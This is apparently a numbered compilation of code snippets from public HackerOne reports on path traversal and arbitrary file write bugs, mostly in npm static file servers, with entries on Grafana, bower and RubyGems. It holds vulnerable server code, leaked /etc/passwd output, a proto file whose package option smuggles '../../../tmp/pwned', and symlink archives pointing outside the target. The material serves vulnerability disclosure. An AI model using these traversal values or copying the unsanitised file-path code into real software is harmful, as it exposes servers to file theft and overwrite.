## 167. [#342066](https://hackerone.com/reports/342066)  -  [bruteser] Path Traversal allows to read content of arbitrary file
*medium*

```javascript
// node_modules/bruteser/server.js, line 8 (some lines removed)


	var filepath = req.url;
	if (filepath=='/') {
		var filepath = '/index.html';
	}

	var ext = path.extname(filepath);

    // REMOVED

	fs.readFile('public'+filepath, function (err, data){
		if (err) {
			if (filepath === '/index.html') {
				res.end("It seems there is no index.html file in 'public' directory");
			} else {
				res.end("There is no file by this address");
			}

			

		}
		res.end(data);
	});
```

## 168. [#319795](https://hackerone.com/reports/319795)  -  [m-server] Path Traversal allows to display content of arbitrary file(s) from the server
*medium*

```
## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

Malicious user is able to display content of any file from the server using eg. crafted
```

## 169. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```javascript
// app.js
const Servey = require('servey');
const Path = require('path') 
const server = Servey.create({
    spa: true,
    port: 8080,
    folder: Path.join(__dirname, 'static')
});

server.on('error', function (error) {
    console.error(error);
});

server.on('request', function (req) {
    console.log(req.url);
});

server.on('open', function () {
    console.log('open');
});

server.open();
```

## 170. [#1427086](https://hackerone.com/reports/1427086)  -  path traversal vulnerability in Grafana 8.x allows " local file read "
*critical*

```http
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
infraop:x:1000:1000:infraop:/home/infraop:/bin/bash
nginx:x:988:982:Nginx web server:/var/lib/nginx:/sbin/nologin
```

## 171. [#1427086](https://hackerone.com/reports/1427086)  -  path traversal vulnerability in Grafana 8.x allows " local file read "
*critical*

```http
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
memcached:x:987:980:Memcached daemon:/run/memcached:/sbin/nologin
redis:x:986:979:Redis Database Server:/var/lib/redis:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
uwayo:x:1003:1003::/home/uwayo:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
mugabo:x:1004:1004::/home/mugabo:/bin/bash
nimble:x:985:978:user for Nimble Streamer:/etc/nimble:/sbin/nologin
arnold:x:1005:1005::/home/arnold:/bin/bash
```

## 172. [#306607](https://hackerone.com/reports/306607)  -  [html-pages] Path Traversal in html-pages module allows to read any file from the server with curl
*critical*

```bash
$ node app.js
```

## 173. [#358112](https://hackerone.com/reports/358112)  -  [buttle] Path traversal in mid-buttle module allows to read any file in the server.
*critical*

```bash
$ npm install -g buttle
```

## 174. [#358112](https://hackerone.com/reports/358112)  -  [buttle] Path traversal in mid-buttle module allows to read any file in the server.
*critical*

```bash
$ buttle ./
```

## 175. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```javascript
// ./node_modules/file-static-server/lib/file.js, line 21:
getFilePath: function () {
    if (this.filePath) {
      return this.filePath
    }
    var url = this.req.url
    var len = process.argv.length
    this.filePath = path.join(process.argv[len - 1], url)
    return this.filePath
  },
```

## 176. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```javascript
// ./node_modules/file-static-server/lib/file.js, line 87:
getStream: function () {
    return fs.createReadStream(this.filePath)
  }
```

## 177. [#822262](https://hackerone.com/reports/822262)  -  Path traversal in Nuget Package Registry
*high, $12,000*

```
XPATHS = {                                                               
        package_name: '//xmlns:package/xmlns:metadata/xmlns:id',               
        package_version: '//xmlns:package/xmlns:metadata/xmlns:version'        
      }.freeze 
...
      def extract_metadata(file)                                               
        doc = Nokogiri::XML(file)                                              
                                                                               
        XPATHS.map do |key, query|                                             
          [key, doc.xpath(query).text]                                         
        end.to_h
```

## 178. [#3384150](https://hackerone.com/reports/3384150)  -  Arbitrary File Write
*high*

```
syntax = "proto3";
package exploit;

// Malicious path traversal
option go_package = "../../../tmp/pwned;exploit";

message MaliciousMessage {
  string data = 1;
}
```

## 179. [#473811](https://hackerone.com/reports/473811)  -  [bower] Arbitrary File Write through improper validation of symlinks while package extraction
*high*

```bash
$ tar -xvf hello.tar.gz
hello/
hello/README.md
hello/link
hello/link/PWNED
hello/package.json

$ tar -tvf hello.tar.gz
drwxr-xr-x 0/0               0 2019-01-01 21:27 hello/
-rw-r--r-- 0/0              12 2019-01-01 21:27 hello/README.md
lrw-r--r-- 0/0               0 2019-01-01 21:27 hello/link -> /tmp
-rw-r--r-- 0/0              15 2019-01-01 21:27 hello/link/PWNED
-rw-r--r-- 0/0             102 2019-01-01 21:27 hello/package.json
```

## 180. [#473811](https://hackerone.com/reports/473811)  -  [bower] Arbitrary File Write through improper validation of symlinks while package extraction
*high*

```bash
$ bower install ./hello.tar.gz
bower hello.tar#*                 copy /home/path/hello.tar.gz
bower hello.tar#*              extract hello.tar.gz
bower hello.tar#*             resolved /home/path/hello.tar.gz
bower hello.tar#*              install hello.tar
```

## 181. [#311218](https://hackerone.com/reports/311218)  -  [hekto] Path Traversal vulnerability allows to read content of arbitrary files
*high*

```bash
$ npm install hekto
```

## 182. [#311218](https://hackerone.com/reports/311218)  -  [hekto] Path Traversal vulnerability allows to read content of arbitrary files
*high*

```bash
$ ./node_modules/hekto/bin/hekto.js serve

Serving on port 3000
```

## 183. [#309120](https://hackerone.com/reports/309120)  -  [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server
*high*

```bash
$ angular-http-server --path ./
```

## 184. [#310943](https://hackerone.com/reports/310943)  -  [general-file-server] Path Traversal vulnerability allows to read content on arbitrary file on the server
*high*

```bash
$ npm install general-file-server
```

## 185. [#312889](https://hackerone.com/reports/312889)  -  [localhost-now] Path Traversal allows to read content of arbitrary file
*high*

```bash
$ npm install localhost-now
```

## 186. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```bash
$ npm install glance
```

## 187. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```http
postgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

## 188. [#319003](https://hackerone.com/reports/319003)  -  [stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)
*high*

```bash
$ npm install stattic
```

## 189. [#311216](https://hackerone.com/reports/311216)  -  [626] Path Traversal allows to read arbitrary file from remote server
*high*

```bash
$ npm install 626
```

## 190. [#311216](https://hackerone.com/reports/311216)  -  [626] Path Traversal allows to read arbitrary file from remote server
*high*

```bash
$ ./node_modules/626/index.js
Listening on 8080
```

## 191. [#312907](https://hackerone.com/reports/312907)  -  [mcstatic] Path Traversal allows to read content of arbitrary files
*high*

```bash
$ npm install mcstatic
```

## 192. [#312918](https://hackerone.com/reports/312918)  -  [public] Path Traversal allows to read content of arbitrary files
*high*

```bash
$ npm install public
```

## 193. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```ruby
class Api::V1::DocumentsController < ApiController
  def create
    file = decode_base64_upload(params[:file_data])

    @project.documents.attach(
      io: file,
      filename: params[:filename],
      content_type: params[:content_type],
      key: "projects/#{@project.id}/#{params[:path]}"  # user input in key
    )

    render json: { status: "uploaded" }
  end
end
```

## 194. [#270072](https://hackerone.com/reports/270072)  -  Unpacker improperly validates symlinks, allowing gems writes to arbitrary locations
*medium*

```bash
$ tar -xvf symlink.gem
metadata.gz
data.tar.gz
$ tar -tvf data.tar.gz
-rw-r--r-- 0/0              12 1969-12-31 16:00 README
lrw-r--r-- 0/0               0 1969-12-31 16:00 link -> /tmp
-rw-r--r-- 0/0               6 1969-12-31 16:00 link/HACKED
```

## 195. [#310690](https://hackerone.com/reports/310690)  -  [crud-file-server] Path Traversal allows to read arbitrary file from the server
*medium*

```bash
$ npm install crud-file-server
```

## 196. [#310690](https://hackerone.com/reports/310690)  -  [crud-file-server] Path Traversal allows to read arbitrary file from the server
*medium*

```bash
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080
```

## 197. [#342066](https://hackerone.com/reports/342066)  -  [bruteser] Path Traversal allows to read content of arbitrary file
*medium*

```bash
$ npm install bruteser
```

## 198. [#342066](https://hackerone.com/reports/342066)  -  [bruteser] Path Traversal allows to read content of arbitrary file
*medium*

```bash
$ node ./node_modules/bruteser/server.js 
Server is running on port 8080
```

## 199. [#593911](https://hackerone.com/reports/593911)  -  [public] Path traversal using symlink
*medium*

```bash
$ ln -s /etc/passwd test_passwd
```

## 200. [#319795](https://hackerone.com/reports/319795)  -  [m-server] Path Traversal allows to display content of arbitrary file(s) from the server
*medium*

```bash
$ npm install m-server
```

## 201. [#319795](https://hackerone.com/reports/319795)  -  [m-server] Path Traversal allows to display content of arbitrary file(s) from the server
*medium*

```bash
$ ./node_modules/m-server/index.js -p 8080
-------------------------------------------------------------
	Mini http server running on port 8080 !
	You can open the floowing urls to view files.
	127.0.0.1:8080
	10.235.1.22:8080
	10.235.4.26:8080
	Have fun ^_^
-------------------------------------------------------------
```

## 202. [#355456](https://hackerone.com/reports/355456)  -  [statics-server] Path Traversal due to lack of provided path sanitization
*medium*

```bash
$ npm install statics-server
```

## 203. [#355456](https://hackerone.com/reports/355456)  -  [statics-server] Path Traversal due to lack of provided path sanitization
*medium*

```bash
$ ./node_modules/statics-server/index.js 
服务器已经启动
访问localhost:8080
```

## 204. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```bash
$ npm install servey
```

## 205. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```bash
$ node app.js 
open
```

## 206. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```bash
$ npm install file-static-server
```

## 207. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```bash
$ ./node_modules/file-static-server/bin/file-static-server -P 8080 ./
server start at 8080
```

## 208. [#993975](https://hackerone.com/reports/993975)  -  [zenn-cli] Path traversal on Windows allows the attacker to read arbitrary .md files
*low*

```
diff --git a/packages/zenn-cli/utils/api/articles.ts b/packages/zenn-cli/utils/api/articles.ts
index 294e7f3..06bfc7f 100644
--- a/packages/zenn-cli/utils/api/articles.ts
+++ b/packages/zenn-cli/utils/api/articles.ts
@@ -29,7 +29,7 @@ export function getArticleBySlug(
 ): Article {
   const fullPath = path.join(
     articlesDirectory,
-    `${slug.replace(/\//g, "")}.md` // Prevent directory traversal
+    `${slug.replace(/[/\\]/g, "")}.md` // Prevent directory traversal
   );
   let fileRaw;
   try {
diff --git a/packages/zenn-cli/utils/api/books.ts b/packages/zenn-cli/utils/api/books.ts
index 25dca4c..b63ec70 100644
--- a/packages/zenn-cli/utils/api/books.ts
+++ b/packages/zenn-cli/utils/api/books.ts
@@ -89,7 +89,7 @@ function getCoverDataUrl(fullDirPath: string): string | null {
 }
 
 export function getBookBySlug(slug: string, fields?: null | string[]): Book {
-  const fullDirPath = path.join(booksDirectory, slug.replace(/\//g, "")); // Prevent directory traversal
+  const fullDirPath = path.join(booksDirectory, slug.replace(/[/\\]/g, "")); // Prevent directory traversal
   const data = getConfigYamlData(fullDirPath);
   if (!data) return null;
 
diff --git a/packages/zenn-cli/utils/api/chapters.ts b/packages/zenn-cli/utils/api/chapters.ts
index 91d878f..ae97ef6 100644
--- a/packages/zenn-cli/utils/api/chapters.ts
+++ b/packages/zenn-cli/utils/api/chapters.ts
@@ -44,8 +44,8 @@ export function getChapter(
   fields?: null | string[]
 ): Chapter {
   const fullPath = path.join(
-    getBookDirPath(bookSlug.replace(/\//g, "")), // Prevent directory traversal
# … truncated …
```
